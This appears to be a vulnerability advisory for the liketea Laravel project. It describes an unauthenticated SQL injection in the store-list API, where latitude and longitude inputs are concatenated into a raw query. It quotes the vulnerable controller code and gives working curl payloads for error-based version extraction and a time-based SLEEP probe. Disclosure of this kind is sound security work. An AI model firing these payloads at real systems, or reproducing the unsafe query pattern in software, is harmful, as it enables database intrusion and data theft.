# [liketea](https://github.com/cameasy/liketea) SQL Injection

### SQL Injection in Geolocation Query [CRITICAL]

#### Description

A critical SQL injection vulnerability exists in the store listing API endpoint that allows unauthenticated attackers to execute arbitrary SQL commands. User-supplied latitude and longitude parameters are directly concatenated into a raw SQL query without sanitization or parameterization.

#### Affected Component

- **File**: `laravel/app/Http/Controllers/Front/StoreController.php`
- **Lines**: 42-46, 73-80
- **Endpoint**: `POST /api/v1/front/store/list`
- **Authentication**: Not Required

#### Vulnerable Code

```php
public function list(Request $request)
{
    $lat = $request->input('lat') ?: '31.182021';
    $lng = $request->input('lng') ?: '121.425562';

    $model = Store::where('is_open', 1)
        ->selectRaw("*, ST_Distance(
            ST_GeomFromText('POINT($lng $lat)'),  // ❌ UNSAFE
            ST_GeomFromText(CONCAT('POINT(', stores.lng, ' ', stores.lat, ')'))
        ) as distance")
        ->orderBy('distance', 'asc')
        ->get();
}
```

#### Proof of Concept

**1. Database Version Extraction**

```bash
curl -X POST http://localhost:8000/api/v1/front/store/list \
  -H "Content-Type: application/json" \
  -d '{"lat":"1","lng":"1'\''))  ,0,0,0,(SELECT version()))#"}'

# Response exposes MySQL version in error message
```

**2. Time-Based Blind SQL Injection**

```bash
# Causes 5-second delay, confirming SQL injection
time curl -X POST http://localhost:8000/api/v1/front/store/list \
  -H "Content-Type: application/json" \
  -d '{"lat":"1","lng":"1'\'')) AND SLEEP(5))#"}'

# Expected: ~5 second delay
```
